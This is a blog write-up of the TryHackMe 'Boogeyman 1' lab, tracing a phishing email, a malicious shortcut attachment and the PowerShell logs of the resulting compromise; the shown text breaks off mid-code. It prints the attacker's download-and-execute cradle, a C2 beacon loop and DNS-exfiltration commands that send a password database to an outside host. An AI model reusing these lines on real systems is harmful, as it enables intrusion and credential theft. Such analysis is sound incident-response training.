<!doctype html><html lang="en" data-mode="dark"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.3.4" /><meta property="og:title" content="Boogeyman 1" /><meta name="author" content="Ibrahim" /><meta property="og:locale" content="en" /><meta name="description" content="A new threat actor emerges from the wild using the name Boogeyman. Are you afraid of the Boogeyman?" /><meta property="og:description" content="A new threat actor emerges from the wild using the name Boogeyman. Are you afraid of the Boogeyman?" /><link rel="canonical" href="/posts/boogyman/" /><meta property="og:url" content="/posts/boogyman/" /><meta property="og:site_name" content="Ibrahim EO." /><meta property="og:image" content="/assets/img/boogeyman/boogeythum.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2024-11-03T00:00:00+01:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="/assets/img/boogeyman/boogeythum.png" /><meta property="twitter:title" content="Boogeyman 1" /><meta name="twitter:site" content="@twitter_username" /><meta name="twitter:creator" content="@Ibrahim" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Ibrahim"},"dateModified":"2024-11-05T13:57:59+01:00","datePublished":"2024-11-03T00:00:00+01:00","description":"A new threat actor emerges from the wild using the name Boogeyman. Are you afraid of the Boogeyman?","headline":"Boogeyman 1","image":"/assets/img/boogeyman/boogeythum.png","mainEntityOfPage":{"@type":"WebPage","@id":"/posts/boogyman/"},"url":"/posts/boogyman/"}</script><title>Boogeyman 1 | Ibrahim EO.</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Ibrahim EO."><meta name="application-name" content="Ibrahim EO."><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="/assets/css/elomarii-portfolio.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.2/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.27.20/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css"> <script async src="https://www.googletagmanager.com/gtag/js?id=G-X4YT79QSQC"></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-X4YT79QSQC'); </script><body><aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end"><header class="profile-wrapper"> <a href="/" id="avatar" class="rounded-circle"><img src="/assets/avatar.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a><h1 class="site-title"> <a href="/whoami">Ibrahim EO.</a></h1><p class="site-subtitle fst-italic mb-0">Information Systems Engineer / InfoSec Enthousiaste</p></header><nav class="flex-column flex-grow-1 w-100 ps-0"><ul class="nav"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/projects/" class="nav-link"> <i class="fa-fw fas fa-bars-progress"></i> <span>PROJECTS</span> </a><li class="nav-item"> <a href="/blog/" class="nav-link"> <i class="fa-fw fas fa-newspaper"></i> <span>BLOG</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/whoami/" class="nav-link"> <i class="fa-fw fas fa-chess-rook"></i> <span>WHOAMI</span> </a></ul></nav><div class="sidebar-bottom d-flex flex-wrap align-items-center w-100"> <a href="https://github.com/elomarii" aria-label="github" target="_blank" rel="noopener noreferrer" > <i class="fab fa-github"></i> </a> <a href="https://www.linkedin.com/in/ibrahim-el-omari/" aria-label="linkedin" target="_blank" rel="noopener noreferrer" > <i class="fab fa-linkedin"></i> </a> <a href="javascript:location.href = 'mailto:' + ['i.ibrahim.elomari','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a></div></aside><div id="main-wrapper" class="d-flex justify-content-center"><div class="container d-flex flex-column px-xxl-5"><header id="topbar-wrapper" aria-label="Top Bar"><div id="topbar" class="d-flex align-items-center justify-content-between px-lg-3 h-100" ><nav id="breadcrumb" aria-label="Breadcrumb"> <span> <a href="/">Home</a> </span> <span>Boogeyman 1</span></nav><button type="button" id="sidebar-trigger" class="btn btn-link"> <i class="fas fa-bars fa-fw"></i> </button><div id="topbar-title"> Post</div><button type="button" id="search-trigger" class="btn btn-link"> <i class="fas fa-search fa-fw"></i> </button> <search id="search" class="align-items-center ms-3 ms-lg-0"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..." > </search> <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button></div></header><div class="row flex-grow-1"><main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4"><article class="px-1"><header><h1 data-toc-skip>Boogeyman 1</h1><p class="post-desc fw-light mb-4">A new threat actor emerges from the wild using the name Boogeyman. Are you afraid of the Boogeyman?</p><div class="post-meta text-muted"> <span> Posted <time data-ts="1730588400" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > Nov 3, 2024 </time> </span><div class="d-flex justify-content-between"> <span> By <em> Ibrahim </em> </span><div> <span class="readtime" data-bs-toggle="tooltip" data-bs-placement="bottom" title="1805 words" > <em>10 min</em> read</span></div></div></div></header><div class="content"><p><a href="/assets/img/boogeyman/boggeybanner.png" class="popup img-link shimmer"><img src="/assets/img/boogeyman/boggeybanner.png" alt="banner" loading="lazy"></a></p><blockquote class="prompt-info"><p>In this room, you will be tasked to analyse the Tactics, Techniques, and Procedures (TTPs) executed by a threat group, from obtaining initial access until achieving its objective. Check out Boogeyman series on TryHackMe: <a href="https://tryhackme.com/jr/boogeyman1">Boogeyman 1</a> , <a href="https://tryhackme.com/jr/boogeyman2">Boogeyman 2</a> , and <a href="https://tryhackme.com/jr/boogeyman3">Boogeyman 3</a>.</p></blockquote><p>Story time:</p><blockquote><p>Julianne, a finance employee working for Quick Logistics LLC, received a follow-up email regarding an unpaid invoice from their business partner, B Packaging Inc. Unbeknownst to her, the attached document was malicious and compromised her workstation. The security team was able to flag the suspicious execution of the attachment, in addition to the phishing reports received from the other finance department employees, making it seem to be a targeted attack on the finance team. Upon checking the latest trends, the initial TTP used for the malicious attachment is attributed to the new threat group named Boogeyman, known for targeting the logistics sector.</p></blockquote><p><a href="/assets/img/boogeyman/phishmail.png" class="popup img-link shimmer"><img src="/assets/img/boogeyman/phishmail.png" alt="phishing-email" loading="lazy"></a> <em>Phishing Email Received By Julianne</em></p><h2 id="i-email-analysis"><span class="me-2">I. Email analysis</span><a href="#i-email-analysis" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Given the initial information, we know that the compromise started with a phishing email. Let’s start with analysing the <code class="language-plaintext filepath highlighter-rouge">dump.eml</code>. We can learn a lot about an email by looking at its raw content. The following are some interesting items to note:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre>...SNIP...
DKIM-Signature: v=1; a=rsa-sha256; d=elasticemail.com; s=api;
	c=relaxed/simple; t=1673601926;
	h=from:date:subject:reply-to:to:list-unsubscribe;
...SNIP...
From: Arthur Griffin &lt;agriffin@bpakcaging.xyz&gt;
Date: Fri, 13 Jan 2023 09:25:26 +0000
Subject: Collection for Quick Logistics LLC - Jan 2023
Message-Id: &lt;4uiwqc5wd1qx.HPk2p-JE_jYbkWIRB-SmuA2@tracking.bpakcaging.xyz&gt;
Reply-To: Arthur Griffin &lt;agriffin@bpakcaging.xyz&gt;
Sender: agriffin@bpakcaging.xyz
To: Julianne Westcott &lt;julianne.westcott@hotmail.com&gt;
...SNIP...
You may use this code to view the encrypted file: Invoice2023!
...SNIP...
--=-eZCfLFLerDWBDeKhYPAtYh7o4CYv5vMw7XWKyw==
Content-Type: application/zip
Content-Disposition: attachment; filename="Invoice.zip"; size=908;
Content-Transfer-Encoding: base64
...SNIP...
</pre></table></code></div></div><p>The email was sent to Julianne from Arthur Griffin on behalf of bpakcaging, it contains an attachment <code class="language-plaintext highlighter-rouge">Invoice.zip</code> that is password-protected with <code class="language-plaintext highlighter-rouge">Invoice123!</code>. Note that <kbd>elasticemail</kbd> was the email relay service used for delivery.</p><p>Let’s take a closer look onto the attachment.</p><ul file="attachment.b64"><li>1/ Extract the base64 content from the email<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="attachment.b64"><i class="far fa-file-code fa-fw"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre>UEsDBBQAAQAIAGiGLVZRFQDJ3gIAACgJAAAUAAAASW52b2ljZV8yMDIzMDEwMy5sbmvuhS6/jU+4
ClhWAZwY+LBcOUvw6oMIq5WNiZwjlKXvAj+pMMBFROiABqlJBxngGOoWUKX0yBXsXOhYPq3Z+Zls
vZX0xZqtZ/KWnX/QpZXzW44KZz1eqH+hnLgKXPTBsyTSqpqK9QUvYEsltPMSYnL0IqSNwX2TuL9l
oB0QB3owNKK2cltANxR5Nt3pdYwKJ4BqqI4x7D/ze4bWBT1jlR4HW8VEByEyLoc2fw3I0r0bc/8J
v9g1SZPBvshBg0pxI0/89GR2agMP+Lv6smkO/huUEOSRpidp/ft+prkt5v9sHFyS/Q0CTb9njCi2
terQ9NTeFAOkNAhGxWUPqPwPzB0cS+GBC2JY3LMqlA0K5aTejRodyVPcLlq2KVbyF7XljH2NZA4T
bFsDNJMFk2fQB1hfvmseP9FA20VAfwYvYW8GnBDdqhJtAwJ5xNvJgFFK/MTY2fChwTNN2zszqhzn
v1Sx+71+duA41HGR9K/jh4nEeRgPslOVlGtLwKBikbIpx/5ZaLpiZYwKS177jDoh3Qx+FRxsM6Ue
hjPSNgKmWHFZjReDWx8KD7qGLL9acO0hvZUuH83b70sAREDJbw+4sC2jcYO+hrHys6E4Dml030WQ
WhkKpvYv4DUw9nDmkGg4YgnyAv/iMbtImSUZQ/Wc6dEJM213hYefp8DTQZ321fZU5iCk86bAdxX2
3Ov40S9eX78X7CSp9b0QKNeC+N3JgMJ/gQrCWC73UfmHjT4mkBoP8A4YktR2LFNeistVP/zeMQPS
qUs8KaI7q+VTu/9buNeWkEW2maDm+bC0Q4AnJL+AocgZDPJ0RzfLWEpff3nbaYb6aPqhLTBfFURi
dszLIMEKmDLmiVqkWZJly9qV26NFttz5y4Q+fAATd6tMYRDlu/BFCo4+rdxjiKl0Gnn7UBHCq0gy
eEv/L8bppKI09XqNV3MJxMLBE3RN7E080hVp07qDpNpQTYEFa08gGy6yYFBLAQI/ABQAAQAIAGiG
LVZRFQDJ3gIAACgJAAAUACQAAAAAAAAAIAAAAAAAAABJbnZvaWNlXzIwMjMwMTAzLmxuawoAIAAA
AAAAAQAYAGiPRUBvJ9kBAAAAAAAAAAAAAAAAAAAAAFBLBQYAAAAAAQABAGYAAAAQAwAAAAA=
</pre></table></code></div></div></ul><ul><li>2/ Decode it<div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span><span class="nb">base64</span> <span class="nt">-d</span> attachment.b64 <span class="o">&gt;</span> Invoice.zip
</pre></table></code></div></div><li>3/ Result</ul><p>We use the password from above to extract <kbd>Invoice_20230103.lnk</kbd> and then <code class="language-plaintext highlighter-rouge">lnkparse3</code> to parse it.</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>unzip Invoice.zip 
<span class="go">
Archive:  Invoice.zip
[Invoice.zip] Invoice_20230103.lnk password: 
  inflating: Invoice_20230103.lnk

</span><span class="gp">$</span><span class="w"> </span>lnkparse Invoice_20230103.lnk
<span class="go">
...SNIP...
   DATA
      Description: Invoice Jan 2023
      Relative path: ..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
      Working directory: C:
      Command line arguments: -nop -windowstyle hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==
      Icon location: C:\Users\Administrator\Desktop\excel.ico
...SNIP...
</span></pre></table></code></div></div><p>We understand now that the invoice tries to trick the user into clicking it so it can spawn a powershell session and execute the base64 encoded command. The arguments <code class="language-plaintext highlighter-rouge">-nop -windowstyle hidden</code> are supplied to execute it in a stealthy fashion.</p><p>Decoding the payload reveals the starting point of endpoint activities. The following is the full powershell payload used to compromise Julianne’s machine.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">iex</span><span class="w"> </span><span class="p">(</span><span class="n">new-object</span><span class="w"> </span><span class="nx">net.webclient</span><span class="p">)</span><span class="o">.</span><span class="nf">downloadstring</span><span class="p">(</span><span class="s1">'http://files.bpakcaging.xyz/update'</span><span class="p">)</span><span class="w">
</span></pre></table></code></div></div><h2 id="ii-are-you-sure-thats-an-invoice"><span class="me-2">II. Are you sure that’s an invoice?</span><a href="#ii-are-you-sure-thats-an-invoice" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We should now proceed with analysing the PowerShell logs to uncover the potential impact of the attack. Using <code class="language-plaintext highlighter-rouge">jq</code>, we can filter for the values of <code class="language-plaintext highlighter-rouge">ScriptBlockText</code>, as it contains the powershell commands being executed.</p><p>We know already that Boogeyman uses <code class="language-plaintext highlighter-rouge">bpakcaging.xyz</code> to host some of its artefacts. Thus, we can narrow down our search in the logs to only the entries with that value:</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span><span class="nb">cat </span>powershell.json | jq <span class="s2">".ScriptBlockText"</span> | <span class="nb">grep </span>bpakcaging
<span class="go">
</span><span class="gp">"$</span><span class="nv">s</span><span class="o">=</span><span class="s1">'cdn.bpakcaging.xyz:8080'</span><span class="p">;</span><span class="nv">$i</span><span class="o">=</span><span class="s1">'8cce49b0-b86459bb-27fe2489'</span><span class="p">;</span><span class="nv">$p</span><span class="o">=</span><span class="s1">'http://'</span><span class="p">;</span><span class="nv">$v</span><span class="o">=</span>Invoke-WebRequest <span class="nt">-UseBasicParsing</span> <span class="nt">-Uri</span> <span class="nv">$p$s</span>/8cce49b0 <span class="nt">-Headers</span> @<span class="o">{</span><span class="se">\"</span>X-38d2-8f49<span class="se">\"</span><span class="o">=</span><span class="nv">$i</span><span class="o">}</span><span class="p">;</span><span class="k">while</span> <span class="o">(</span><span class="nv">$true</span><span class="o">){</span><span class="nv">$c</span><span class="o">=(</span>Invoke-WebRequest <span class="nt">-UseBasicParsing</span> <span class="nt">-Uri</span> <span class="nv">$p$s</span>/b86459bb <span class="nt">-Headers</span> @<span class="o">{</span><span class="se">\"</span>X-38d2-8f49<span class="se">\"</span><span class="o">=</span><span class="nv">$i</span><span class="o">})</span>.Content<span class="p">;</span><span class="k">if</span> <span class="o">(</span><span class="nv">$c</span> <span class="nt">-ne</span> <span class="s1">'None'</span><span class="o">)</span> <span class="o">{</span><span class="nv">$r</span><span class="o">=</span>iex <span class="nv">$c</span> <span class="nt">-ErrorAction</span> Stop <span class="nt">-ErrorVariable</span> e<span class="p">;</span><span class="nv">$r</span><span class="o">=</span>Out-String <span class="nt">-InputObject</span> <span class="nv">$r</span><span class="p">;</span><span class="nv">$t</span><span class="o">=</span>Invoke-WebRequest <span class="nt">-Uri</span> <span class="nv">$p$s</span>/27fe2489 <span class="nt">-Method</span> POST <span class="nt">-Headers</span> @<span class="o">{</span><span class="se">\"</span>X-38d2-8f49<span class="se">\"</span><span class="o">=</span><span class="nv">$i</span><span class="o">}</span> <span class="nt">-Body</span> <span class="o">([</span>System.Text.Encoding]::UTF8.GetBytes<span class="o">(</span><span class="nv">$e</span>+<span class="nv">$r</span><span class="o">)</span> <span class="nt">-join</span> <span class="s1">' '</span><span class="o">)}</span> <span class="nb">sleep </span>0.8<span class="o">}</span><span class="se">\n</span><span class="s2">"
</span><span class="go">"iex (new-object net.webclient).downloadstring('http://files.bpakcaging.xyz/update')"
</span><span class="gp">"iwr http://files.bpakcaging.xyz/sb.exe -outfile sb.exe;</span><span class="nb">pwd</span><span class="s2">"
</span><span class="gp">"iwr http://files.bpakcaging.xyz/sq3.exe -outfile sq3.exe;</span><span class="s2">pwd"</span>
<span class="gp">"$</span><span class="nb">split</span> <span class="o">=</span> <span class="nv">$hex</span> <span class="nt">-split</span> <span class="s1">'(\\S{50})'</span><span class="p">;</span> ForEach <span class="o">(</span><span class="nv">$line</span> <span class="k">in</span> <span class="nv">$split</span><span class="o">)</span> <span class="o">{</span> nslookup <span class="nt">-q</span><span class="o">=</span>A <span class="se">\"</span><span class="nv">$line</span>.bpakcaging.xyz<span class="se">\"</span> <span class="nv">$destination</span><span class="p">;</span><span class="o">}</span> <span class="nb">echo</span> <span class="se">\"</span>Done<span class="se">\"</span><span class="p">;;</span><span class="nb">pwd</span><span class="s2">"
</span></pre></table></code></div></div><p>It is now clear that the attacker is using <kbd>files.bpakcaging.xyz</kbd> and <kbd>cdn.bpakcaging.xyz</kbd> to host C2 related artefacts.</p><p>To view all relevant powershell commands, we can use the same command and filter out non interesting entries (particularly <code class="language-plaintext highlighter-rouge">Set-StrictMode</code>).</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span><span class="nb">cat </span>powershell.json | jq <span class="s2">".ScriptBlockText"</span> | <span class="nb">grep</span> <span class="nt">-v</span> Set-StrictMode
<span class="go">
null
</span><span class="gp">"iex(new-object net.webclient).downloadstring('https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-Seatbelt.ps1');</span><span class="nb">pwd</span><span class="s2">"
</span><span class="go">null
</span><span class="gp">"ps;</span><span class="nb">pwd</span><span class="s2">"
</span><span class="go">null
null
</span><span class="gp">"cd j.westcott;</span><span class="nb">pwd</span><span class="s2">"
</span><span class="go">...SNIP...
</span><span class="gp">".\\sb.exe -group=user;</span><span class="nb">pwd</span><span class="s2">"
</span><span class="go">null
</span><span class="gp">"Seatbelt.exe -group=user;</span><span class="nb">pwd</span><span class="s2">"
</span><span class="go">null
</span><span class="gp">"split-path $</span><span class="nb">pwd</span><span class="s1">'\\0x00'</span><span class="p">;</span><span class="nb">pwd</span><span class="s2">"
</span><span class="go">...SNIP...
</span><span class="gp">"cd Documents;</span><span class="nb">pwd</span><span class="s2">"
</span><span class="go">null
</span><span class="gp">".\\Music\\sq3.exe AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite \"SELECT * from NOTE limit 100\";</span><span class="nb">pwd</span><span class="s2">"
</span><span class="go">null
</span><span class="gp">".\\sq3.exe AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\;</span><span class="nb">pwd</span><span class="s2">"
</span><span class="go">...SNIP...
</span><span class="gp">"$</span><span class="nb">split</span> <span class="o">=</span> <span class="nv">$hex</span> <span class="nt">-split</span> <span class="s1">'(\\S{50})'</span><span class="p">;</span> ForEach <span class="o">(</span><span class="nv">$line</span> <span class="k">in</span> <span class="nv">$split</span><span class="o">)</span> <span class="o">{</span> nslookup <span class="nt">-q</span><span class="o">=</span>A <span class="se">\"</span><span class="nv">$line</span>.bpakcaging.xyz<span class="se">\"</span> <span class="nv">$destination</span><span class="p">;</span><span class="o">}</span> <span class="nb">echo</span> <span class="se">\"</span>Done<span class="se">\"</span><span class="p">;;</span><span class="nb">pwd</span><span class="s2">"
</span><span class="go">null
</span><span class="gp">"$</span>hex <span class="o">=</span> <span class="o">(</span><span class="nv">$bytes</span>|ForEach-Object ToString X2<span class="o">)</span> <span class="nt">-join</span> <span class="s1">''</span><span class="p">;;</span><span class="nb">pwd</span><span class="s2">"
</span><span class="go">null
</span><span class="gp">"$</span><span class="nv">file</span><span class="o">=</span><span class="s1">'C:\\Users\\j.westcott\\Documents\\protected_data.kdbx'</span><span class="p">;</span> <span class="nv">$destination</span> <span class="o">=</span> <span class="se">\"</span>167.71.211.113<span class="se">\"</span><span class="p">;</span> <span class="nv">$bytes</span> <span class="o">=</span> <span class="o">[</span>System.IO.File]::ReadAllBytes<span class="o">(</span><span class="nv">$file</span><span class="o">)</span><span class="p">;;</span><span class="nb">pwd</span><span class="s2">"
</span></pre></table></code></div></div><p>Notice that the attacker executed <kbd>Seatbelt</kbd>, which is an enumeration tool. From the same output, we identify the file accessed using <code class="language-plaintext highlighter-rouge">sq3.exe</code>. As the path implies, the target software is <kbd>Microsot Sticky Notes</kbd>.</p><pre><code class="language-txt">C:\\Users\\j.westcott\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite
</code></pre><p>One of the first executed commands was to exfiltrate the file <code class="language-plaintext highlighter-rouge">protected_data.kdbx</code>. <code class="language-plaintext highlighter-rouge">.kdbx</code> is an extension used by <kbd>KeePass</kbd> Password Safe, an open-source password manager primarly for windows. Hence, we can assume the bad guy did exfiltrate some important password-protected data from Julianne’s machine. The adversary used <kbd>nslookup</kbd> to exfiltrate the data, which is a DNS smuggling technique.</p><h2 id="iii-they-got-us-call-the-bank-immediately"><span class="me-2">III. They got us. Call the bank immediately!</span><a href="#iii-they-got-us-call-the-bank-immediately" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Based on the PowerShell logs investigation, we have seen the full impact of the attack:</p><ul><li>The threat actor was able to read and exfiltrate two potentially sensitive files (<code class="language-plaintext filepath highlighter-rouge">plum.sqlite</code> and <code class="language-plaintext filepath highlighter-rouge">protected_data.kdbx</code>).<li>The domains and ports used for the network activity were discovered, including the tool used by the threat actor for exfiltration.</ul><p>The adversary used an HTTP server to host his artefacts. Filtering for HTTP in Wireshark and looking for requests with the hostname <code class="language-plaintext highlighter-rouge">files.bpakcaging.xyz</code>, we find a stream that can be used to identify the software used by the server, i.e. <kbd>SimpleHTTP Python server</kbd>. Similarly by looking at HTTP requests made to the host <code class="language-plaintext highlighter-rouge">cdn.bpakcaging.xyz</code>, we see that the adversary used POST requests to send data to the server.</p><p><a href="/assets/img/boogeyman/image-1.png" class="popup img-link shimmer"><img src="/assets/img/boogeyman/image-1.png" alt="alt text" loading="lazy"></a> <em>Filtering packets and following an HTTP stream</em></p><p><a href="/assets/img/boogeyman/image.png" class="popup img-link shimmer"><img src="/assets/img/boogeyman/image.png" alt="alt text" loading="lazy"></a> <em>The C2 HTTP server details</em></p><p>We found out from before that our Boogeyman exfiltrated (smuggled) data over DNS using <code class="language-plaintext highlighter-rouge">nslookup</code>. In the following screenshot, we validate that our APT lookup subdomains of <code class="language-plaintext highlighter-rouge">bpakcaging.xyz</code>, where each subdomain is a hexadecimal encoding of the next line in the file to be smuggled (checkout the powershell command above). Boogeyman can reconstruct the file based on all received DNS queries.</p><p><a href="/assets/img/boogeyman/image-2.png" class="popup img-link shimmer"><img src="/assets/img/boogeyman/image-2.png" alt="alt text" loading="lazy"></a> <em>DNS smuggling through subdomains</em></p><p>Back to C2 communication. We need to understand how the communication is taking place to be able to complete our investigation. C2 communication establishment:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$s</span><span class="o">=</span><span class="s1">'cdn.bpakcaging.xyz:8080'</span><span class="p">;</span><span class="nv">$i</span><span class="o">=</span><span class="s1">'8cce49b0-b86459bb-27fe2489'</span><span class="p">;</span><span class="nv">$p</span><span class="o">=</span><span class="s1">'http://'</span><span class="p">;</span><span class="nv">$v</span><span class="o">=</span><span class="n">Invoke-WebRequest</span><span class="w"> </span><span class="nt">-UseBasicParsing</span><span class="w"> </span><span class="nt">-Uri</span><span class="w"> </span><span class="nv">$p$s</span><span class="nx">/8cce49b0</span><span class="w"> </span><span class="nt">-Headers</span><span class="w"> </span><span class="p">@{</span><span class="err">\</span><span class="s2">"X-38d2-8f49\"</span><span class="o">=</span><span class="nv">$i</span><span class="p">};</span><span class="kr">while</span><span class="w"> </span><span class="p">(</span><span class="bp">$true</span><span class="p">){</span><span class="nv">$c</span><span class="o">=</span><span class="p">(</span><span class="n">Invoke-WebRequest</span><span class="w"> </span><span class="nt">-UseBasicParsing</span><span class="w"> </span><span class="nt">-Uri</span><span class="w"> </span><span class="nv">$p$s</span><span class="nx">/b86459bb</span><span class="w"> </span><span class="nt">-Headers</span><span class="w"> </span><span class="p">@{</span><span class="err">\</span><span class="s2">"X-38d2-8f49\"</span><span class="o">=</span><span class="nv">$i</span><span class="p">})</span><span class="o">.</span><span class="nf">Content</span><span class="p">;</span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$c</span><span class="w"> </span><span class="o">-ne</span><span class="w"> </span><span class="s1">'None'</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="nv">$r</span><span class="o">=</span><span class="n">iex</span><span class="w"> </span><span class="nv">$c</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">Stop</span><span class="w"> </span><span class="nt">-ErrorVariable</span><span class="w"> </span><span class="nx">e</span><span class="p">;</span><span class="nv">$r</span><span class="o">=</span><span class="n">Out-String</span><span class="w"> </span><span class="nt">-InputObject</span><span class="w"> </span><span class="nv">$r</span><span class="p">;</span><span class="nv">$t</span><span class="o">=</span><span class="n">Invoke-WebRequest</span><span class="w"> </span><span class="nt">-Uri</span><span class="w"> </span><span class="nv">$p$s</span><span class="nx">/27fe2489</span><span class="w"> </span><span class="nt">-Method</span><span class="w"> </span><span class="nx">POST</span><span class="w"> </span><span class="nt">-Headers</span><span class="w"> </span><span class="p">@{</span><span class="err">\</span><span class="s2">"X-38d2-8f49\"</span><span class="o">=</span><span class="nv">$i</span><span class="p">}</span><span class="w"> </span><span 